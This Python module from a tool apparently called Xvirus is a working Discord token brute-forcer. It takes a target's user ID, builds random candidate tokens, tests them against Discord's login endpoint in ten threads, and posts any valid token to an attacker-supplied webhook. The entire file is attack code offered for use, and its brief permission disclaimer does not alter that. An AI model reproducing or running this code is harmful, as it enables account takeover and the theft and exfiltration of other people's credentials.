import base64
import os
import random
import string
import threading

import requests
from colorama import Fore

from util.plugins.common import *


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

def tokenbrute():
    XTitle("Token BruteForce")
    print(" <*> Xvirus token brute-force. PS: This might take a long time to work.")
    print(" <*> If you are extremely lucky and able to get someone's token, you will find it in brute-force.txt")
    print(" <*> Do not do this without the permission of the person to whom the brute force attack is conducted.")

    id_to_token = base64.b64encode((input(" <~> Id of user: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    DISCORD_WEBHOOK_URL = input(f'{Fore.RED} <~> Webhook Url: {Fore.BLUE}')

    def bruteforce():
        while True:
            token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(
                random.choices(string.ascii_letters + string.digits, k=25))
            login = requests.get('https://discord.com/api/v9/auth/login', headers=getheaders(token))
            try:
                if login.status_code == 200:
                    print(f'{Fore.BLUE} <*> Valid' + ' ' + token)
                    send_to_discord(token)
                else:
                    print(f'{Fore.RED} <!> Invalid' + ' ' + token)
            except Exception as e:
                print('Error:', e)
            finally:
                print('')

    def send_to_discord(token):
        data = {
            "content": token,
        }
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(' <!> Error sending to Discord:', e)

    def start_threads():
        for _ in range(10):
            threading.Thread(target=bruteforce).start()

    start_threads()

